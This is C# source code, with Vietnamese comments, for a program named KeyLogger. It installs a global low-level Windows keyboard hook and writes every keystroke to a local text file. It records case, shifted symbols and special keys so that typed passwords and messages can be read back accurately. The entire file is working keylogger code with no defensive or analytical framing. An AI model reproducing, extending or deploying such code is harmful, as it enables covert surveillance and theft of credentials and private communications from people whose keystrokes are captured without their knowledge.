using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Text;

namespace KeyLogger
{
    class appstart
    {
        public static string path = "fileKeyLog.txt";
        public static bool isRecording = false; // Công tắc bật/tắt
    }

    class InterceptKeys
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] [return: MarshalAs(UnmanagedType.Bool)] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)] private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        public static void startKLog()
        {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (!appstart.isRecording) return CallNextHookEx(_hookID, nCode, wParam, lParam);

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Keys key = (Keys)vkCode;

                if (key == Keys.Packet) 
                {
                    // Bỏ qua, không ghi vào file, nhưng vẫn cho phép phím hoạt động
                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                }
                
                try 
                {
                    using (StreamWriter sw = File.AppendText(appstart.path))
                    {
                        // --- XỬ LÝ PHÍM ĐẶC BIỆT ---
                        if (key == Keys.Space)
                        {
                            sw.Write(" "); // Dấu cách thì ghi khoảng trắng
                        }
                        else if (key == Keys.Return)
                        {
                            sw.WriteLine(""); // Enter thì xuống dòng luôn cho dễ đọc
                        }
                        else if (key == Keys.Back)
                        {
                            sw.Write("[<-]"); // Backspace ghi mũi tên lùi cho gọn
                        }
                        else if (key == Keys.Tab) sw.Write("[Tab]");
                        else if (key == Keys.Escape) sw.Write("[Esc]");
                        
                        // --- CÁC PHÍM ĐIỀU KHIỂN (MODIFIERS) ---
                        else if (key == Keys.LControlKey) sw.Write("[LCtrl]");
                        else if (key == Keys.RControlKey) sw.Write("[RCtrl]");
                        else if (key == Keys.LShiftKey) sw.Write("[LShift]");
                        else if (key == Keys.RShiftKey) sw.Write("[RShift]");
                        else if (key == Keys.LMenu) sw.Write("[LAlt]");
                        else if (key == Keys.RMenu) sw.Write("[RAlt]");
                        else if (key == Keys.LWin || key == Keys.RWin) sw.Write("[Win]");
                        
                        // --- CÁC PHÍM FUNCTION (F1-F12) ---
                        else if (key >= Keys.F1 && key <= Keys.F12)
                        {
                            sw.Write("[" + key.ToString() + "]"); // Ghi [F1], [F5]...
                        }
                        // --- CÁC PHÍM ĐIỀU HƯỚNG ---
                        else if (key == Keys.Left) sw.Write("[Left]");
                        else if (key == Keys.Right) sw.Write("[Right]");
                        else if (key == Keys.Up) sw.Write("[Up]");
                        else if (key == Keys.Down) sw.Write("[Down]");
                        else if (key == Keys.Delete) sw.Write("[Del]");
                        else if (key == Keys.Home) sw.Write("[Home]");
                        else if (key == Keys.End) sw.Write("[End]");
                        else if (key == Keys.Insert) sw.Write("[Ins]");
                        else if (key == Keys.PageUp) sw.Write("[PgUp]");
                        else if (key == Keys.PageDown) sw.Write("[PgDn]");
                        
                        // --- CÁC PHÍM KÝ TỰ BÌNH THƯỜNG ---
                        else
                        {
                            // Kiểm tra trạng thái Shift và CapsLock để ghi hoa/thường chuẩn xác
                            bool shift = (Control.ModifierKeys & Keys.Shift) == Keys.Shift;
                            bool caps = Control.IsKeyLocked(Keys.CapsLock);
                            
                            string charKey = key.ToString();

                            // Xử lý số và ký tự đặc biệt trên bàn phím số
                            if (charKey.Length == 2 && charKey.StartsWith("D") && char.IsDigit(charKey[1])) 
                            {
                                // Phím số dãy trên (D0-D9)
                                string[] shiftSymbols = { ")", "!", "@", "#", "$", "%", "^", "&", "*", "(" };
                                int num = int.Parse(charKey.Substring(1));
                                sw.Write(shift ? shiftSymbols[num] : num.ToString());
                            }
                            else if (charKey.StartsWith("Oem"))
                            {
                                // Xử lý các dấu chấm phẩy, ngoặc... (đơn giản hóa)
                                sw.Write(GetKeyString(key, shift));
                            }
                            else if (charKey.Length == 1) // Chữ cái A-Z
                            {
                                bool isUpper = (shift ^ caps); // XOR: 1 trong 2 bật thì hoa, cả 2 bật thì thường
                                sw.Write(isUpper ? charKey.ToUpper() : charKey.ToLower());
                            }
                            else 
                            {
                                // Các phím lạ khác
                                sw.Write(charKey);
                            }
                        }
                    }
                }
                catch { }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        // Hàm phụ trợ để map phím đặc biệt (Oem)
        private static string GetKeyString(Keys key, bool shift)
        {
            switch (key)
            {
                case Keys.Oemtilde: return shift ? "~" : "`";
                case Keys.OemMinus: return shift ? "_" : "-";
                case Keys.Oemplus: return shift ? "+" : "=";
                case Keys.OemOpenBrackets: return shift ? "{" : "[";
                case Keys.OemCloseBrackets: return shift ? "}" : "]";
                case Keys.Oem5: return shift ? "|" : "\\"; // Dấu gạch chéo ngược
                case Keys.Oem1: return shift ? ":" : ";";
                case Keys.Oem7: return shift ? "\"" : "'";
                case Keys.Oemcomma: return shift ? "<" : ",";
                case Keys.OemPeriod: return shift ? ">" : ".";
                case Keys.OemQuestion: return shift ? "?" : "/";
                default: return "";
            }
        }
    }
}